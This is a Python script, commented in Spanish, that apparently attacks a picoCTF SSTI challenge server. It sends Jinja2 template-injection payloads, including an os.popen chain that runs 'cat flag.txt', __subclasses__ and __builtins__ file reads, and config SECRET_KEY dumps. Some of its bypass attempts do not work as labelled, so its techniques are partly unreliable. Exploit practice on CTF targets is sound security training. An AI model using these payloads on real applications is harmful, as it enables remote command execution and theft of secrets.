#!/usr/bin/env python3
import urllib.request
import urllib.parse
import re

print("=" * 60)
print("SSTI2 - BYPASS DE FILTROS ESTRICTOS")
print("=" * 60)

url = "http://shape-facility.picoctf.net:49832/"

def send_payload(payload):
    """Envía un payload al servidor"""
    try:
        data = urllib.parse.urlencode({
            'announcement': payload
        }).encode()
        
        req = urllib.request.Request(url, data=data)
        response = urllib.request.urlopen(req, timeout=5)
        return response.read().decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error: {e}"

print(f"\nServidor: {url}")
print("\nCaracteres bloqueados detectados: . _ {{ }} [] () ' \" ")
print("\nIntentando bypass usando filtros de Jinja2...")

# Estrategia: usar |attr y request.args para evitar caracteres bloqueados
# También probar con codificación hexadecimal y unicode

payloads = [
    # Intento 1: Sin ningún carácter bloqueado (imposible pero intentemos)
    ("test", "Test básico"),
    
    # Intento 2: Usando lipsum con attr
    ("lipsum", "Verificar si lipsum existe"),
    
    # Intento 3: Inyección básica con caracteres permitidos
    ("7*7", "Multiplicación sin llaves"),
    
    # Intento 4: URL encoding completo
    ("%7B%7B7%2A7%7D%7D", "URL encoded {{7*7}}"),
    
    # Intento 5: HTML entities
    ("&#123;&#123;7*7&#125;&#125;", "HTML entities"),
    
    # Intento 6: Unicode
    ("\u007B\u007B7*7\u007D\u007D", "Unicode"),
    
    # Intento 7: Hex encoding
    ("\x7B\x7B7*7\x7D\x7D", "Hex encoding"),
    
    # Intento 8: Base64 (si el servidor lo decodifica)
    ("e3s3Kjd9fQ==", "Base64 de {{7*7}}"),
    
    # Intento 9: Sin template tags
    ("config", "Config directo"),
    ("lipsum", "Lipsum directo"),
    ("request", "Request directo"),
    ("g", "Variable g"),
    
    # Intento 10: Usando request headers o cookies
    ("HTTP_HOST", "Header host"),
]

print("\n[1] Probando payloads de reconocimiento...")

for payload, description in payloads[:5]:
    print(f"\n  {description}: {payload}")
    result = send_payload(payload)
    
    # Analizar respuesta
    if "49" in result and "7" in payload:
        print(f"    ✓ SSTI detectado! Expresión evaluada")
    elif payload in result:
        print(f"    → Reflejado sin evaluación")
    elif "error" in result.lower():
        print(f"    ✗ Error del servidor")
    else:
        print(f"    → Sin reflejo directo")

# Si los caracteres están muy filtrados, intentar con request parameters
print("\n[2] Intentando inyección via parámetros GET...")

# Construir URL con parámetros
params = {
    'cmd': 'cat flag.txt',
    'g': '__globals__',
    'o': 'os',
    'p': 'popen',
    'r': 'read',
    'c': '__class__',
    'b': '__base__',
    's': '__subclasses__',
}

param_string = urllib.parse.urlencode(params)
full_url = f"{url}?{param_string}"

print(f"\n  URL con parámetros: {full_url[:80]}...")

# Payloads que usan request.args
param_payloads = [
    # Usando request.values o request.args
    "request.args",
    "request.values", 
    "request.args.cmd",
    "request.args.g",
    
    # Intentar ejecutar via parámetros
    "lipsum[request.args.g][request.args.o][request.args.p](request.args.cmd)[request.args.r]()",
    
    # Versiones simplificadas
    "lipsum[request.args.g]",
    "lipsum.__globals__",
]

for payload in param_payloads[:3]:
    print(f"\n  Payload con params: {payload}")
    
    # Enviar con parámetros GET
    try:
        data = urllib.parse.urlencode({'announcement': payload}).encode()
        req = urllib.request.Request(full_url, data=data)
        response = urllib.request.urlopen(req, timeout=5)
        result = response.read().decode('utf-8', errors='ignore')
        
        if "picoCTF{" in result:
            flag_match = re.search(r'picoCTF\{[^}]+\}', result)
            if flag_match:
                print(f"\n" + "=" * 60)
                print(f"✓ FLAG ENCONTRADA: {flag_match.group()}")
                print("=" * 60)
                exit(0)
        elif "flag" in result.lower():
            print(f"    ⚠ Posible pista sobre flag")
    except:
        pass

print("\n[3] Último intento - Fuerza bruta de payloads conocidos...")

# Payloads que han funcionado en CTFs anteriores
known_payloads = [
    # Sin filtros
    "{{config.items()}}",
    "{{get_flashed_messages.__globals__.__builtins__.open('/flag.txt').read()}}",
    "{{request.__class__.__mro__[1].__subclasses__()[414]('/flag.txt').read()}}",
    
    # Con bypass básico
    "{{config['SECRET_KEY']}}",
    "{{config['FLAG']}}",
    "{{config.FLAG}}",
    
    # Leyendo directamente
    "{{open('/flag.txt').read()}}",
    "{{open('flag.txt').read()}}",
    "{{open('../flag.txt').read()}}",
    "{{open('../../flag.txt').read()}}",
    
    # Usando g (variable global en algunos templates)
    "{{g}}",
    "{{g.flag}}",
    
    # Debug info
    "{{debug}}",
    "{{app.config}}",
]

for payload in known_payloads:
    result = send_payload(payload)
    
    if "picoCTF{" in result:
        flag_match = re.search(r'picoCTF\{[^}]+\}', result)
        if flag_match:
            print(f"\n✓ FLAG: {flag_match.group()}")
            break

print("\n" + "=" * 60)
print("Nota: Si no se encontró la flag, el filtrado es muy estricto.")
print("Puede requerir técnicas más avanzadas o información adicional.")
print("=" * 60)